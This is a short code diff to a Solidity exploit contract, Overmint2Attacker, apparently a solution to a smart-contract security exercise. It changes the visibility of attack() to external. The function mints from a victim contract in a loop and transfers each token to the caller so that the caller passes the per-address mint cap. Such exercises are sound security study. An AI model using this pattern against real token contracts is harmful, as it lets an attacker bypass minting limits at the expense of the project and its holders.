@@ -14,7 +14,7 @@ contract Overmint2Attacker {
     }
 
     /// @notice Allows a different address to get the minted token allowin their balance to be bigger than the max minting amount
-    function attack() public {
+    function attack() external {
         for (uint256 i = 0; i < 5; i++) {
             Overmint2(victim).mint();
             Overmint2(victim).transferFrom(address(this), msg.sender, Overmint2(victim).totalSupply());
